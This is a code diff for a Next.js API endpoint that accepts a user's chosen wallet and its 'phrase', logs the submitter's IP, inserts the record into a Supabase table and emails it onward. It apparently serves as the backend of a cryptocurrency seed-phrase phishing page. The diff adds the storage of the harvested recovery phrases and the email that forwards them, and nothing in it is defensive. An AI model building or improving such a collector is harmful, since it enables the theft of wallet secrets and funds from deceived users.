@@ -1,40 +1,5 @@
-import { writeFile, readFile, mkdir } from 'fs/promises'
-import { existsSync } from 'fs'
-import path from 'path'
-
-const DATA_FILE = path.join(process.cwd(), 'data', 'submissions.json')
-
-// Ensure data directory exists
-async function ensureDataDir() {
-  const dataDir = path.dirname(DATA_FILE)
-  if (!existsSync(dataDir)) {
-    await mkdir(dataDir, { recursive: true })
-  }
-}
-
-// Read existing submissions
-async function readSubmissions() {
-  try {
-    if (existsSync(DATA_FILE)) {
-      const data = await readFile(DATA_FILE, 'utf-8')
-      return JSON.parse(data)
-    }
-  } catch (error) {
-    console.error('Error reading submissions:', error)
-  }
-  return []
-}
-
-// Write submissions to file
-async function writeSubmissions(submissions) {
-  try {
-    await ensureDataDir()
-    await writeFile(DATA_FILE, JSON.stringify(submissions, null, 2))
-  } catch (error) {
-    console.error('Error writing submissions:', error)
-    throw error
-  }
-}
+import { supabase, TABLES } from '../../../lib/supabase'
+import { sendEmailNotification } from '../../../lib/email'
 
 export async function POST(request) {
   try {
@@ -49,28 +14,44 @@ export async function POST(request) {
       )
     }
 
-    // Read existing submissions
-    const submissions = await readSubmissions()
-
-    // Create new submission
+    // Create new submission with snake_case column names for Supabase
     const newSubmission = {
-      id: Date.now().toString(),
-      selectedWallet,
+      selected_wallet: selectedWallet,
       phrase,
       timestamp,
       ip: request.headers.get('x-forwarded-for') || 'unknown'
     }
 
-    // Add to submissions
-    submissions.push(newSubmission)
+    // Insert into Supabase
+    console.log('Sending to Supabase:', newSubmission)
+    const { data, error } = await supabase
+      .from(TABLES.SUBMISSIONS)
+      .insert([newSubmission])
+      .select()
 
-    // Write back to file
-    await writeSubmissions(submissions)
+    if (error) {
+      console.error('Supabase error:', error)
+      return Response.json(
+        { error: 'Database error' },
+        { status: 500 }
+      )
+    }
+
+    console.log('Supabase response:', data)
+
+    // Send email notification
+    await sendEmailNotification({
+      selectedWallet, // Use original camelCase for email
+      phrase,
+      timestamp,
+      ip: request.headers.get('x-forwarded-for') || 'unknown',
+      id: data[0].id
+    })
 
     return Response.json({
       success: true,
       message: 'Phrase submitted successfully',
-      submissionId: newSubmission.id
+      submissionId: data[0].id
     })
 
   } catch (error) {
@@ -81,3 +62,4 @@ export async function POST(request) {
     )
   }
 }
+
